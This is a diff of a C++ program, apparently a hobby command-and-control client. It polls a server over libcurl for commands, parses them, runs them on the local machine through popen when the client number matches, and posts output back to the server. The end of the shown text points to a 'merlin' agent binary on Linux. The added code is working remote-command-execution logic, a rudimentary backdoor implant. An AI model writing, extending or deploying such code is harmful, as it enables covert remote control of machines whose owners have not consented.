@@ -1,4 +1,7 @@
 #include <string>
+#include <vector>
+#include <stdio.h>
+#include <stdlib.h>
 #include <iostream>
 #include "curl/curl.h"
 
@@ -21,6 +24,15 @@ string get_os_name() {
     return "Other";
     #endif
 }
+
+int CLIENTNUMBER;
+string LASTCOMMAND;
+
+struct Command{
+    string time;
+    int ClientNumber;
+    string command;
+} type;
 
 size_t write_data_file(void *ptr, size_t size, size_t nmemb, FILE *stream) {
     size_t written = fwrite(ptr, size, nmemb, stream);
@@ -65,9 +77,24 @@ void send_terminal_back(int clientNumber, string terminal){
     curl_easy_cleanup(curl);
 }
 
-void send_to_terminal(string cmd){
-    string command = '"' + cmd + '"';
-    system(command.c_str());
+string send_to_terminal(string cmd){
+    //system(cmd.c_str());
+    char path[1035];
+
+    FILE *fp = popen( cmd.c_str(), "r");
+
+    if( fp == NULL){
+        cout << "Failed to run" << endl;
+    }
+    char output [1035];
+    string final = "";
+    while( fgets(path, sizeof(path)-1, fp) != NULL){
+        final += path;
+    }
+
+    pclose(fp);
+
+    return final;
 }
 
 string get_command()
@@ -94,18 +121,90 @@ string get_command()
     return readBuffer;
 }
 
+// the header of the url responce gets mixed up with 
+string strip_responce_string(string res){
+    size_t pos = res.find("time:"); //get location of time:
+    res.erase(0,pos); //delete everthing before that line
+    return res;
+}
+
+// I hate this function. So I hardcoded it.
+void parse_command(Command &cmd, string str){
+    vector<string> v;
+
+    size_t plc = str.find("cnum:");
+
+    //Time value saved
+    v.push_back( str.substr(0,plc) );
+    str.erase(0,plc);
+
+    //client number
+    plc = str.find("cmd:");
+    v.push_back( str.substr(0,plc) );
+    str.erase(0,plc);
+
+    //command string
+    //str.erase(0,4);
+    v.push_back( str );
+
+
+    string temp;
+    temp = v[0];
+    temp.erase(0,5);
+    cmd.time = temp;
+    temp.clear();
+
+    temp = v[1];
+    temp.erase(0,5);
+    cmd.ClientNumber = stoi(temp);
+    temp.clear();
+
+    temp = v[2];
+    temp.erase(0,4);
+    cmd.command = temp;
+    temp.clear();
+}
+
+
+void Check_Num_Send_to_Terminal(Command obj){
+    string res;
+    if(CLIENTNUMBER == obj.ClientNumber && LASTCOMMAND != obj.command){
+        res = send_to_terminal(obj.command);
+        cout << res << endl;
+        LASTCOMMAND = obj.command;
+    }else{
+        return;
+    }
+}
+
+
 int main() {
     string os_name = get_os_name();
     cout << os_name << endl;
 
+    //Connect to server and get client number
+    CLIENTNUMBER = 1;
+    LASTCOMMAND = "";
+
     //Post Test
-    //string testOutput;
-    //send_terminal_back(1, "This is a test message");
+    string testOutput;
+    send_terminal_back(1, "This is a test message");
+    cout << endl;
 
 
     //Get Test
     string outputTest = get_command();
-    cout << outputTest << endl;
+    outputTest = strip_responce_string(outputTest);
+
+    //Put data in this struct to hold for later use.
+    struct Command newCmd;
+    parse_command(newCmd, outputTest);
+
+    //Apply command if for correct machine
+    Check_Num_Send_to_Terminal(newCmd);
+
+
+    //cout << outputTest << endl;
 
     if (os_name == "Linux") {
         /*string merlin = "/data/local/tmp/merlin";
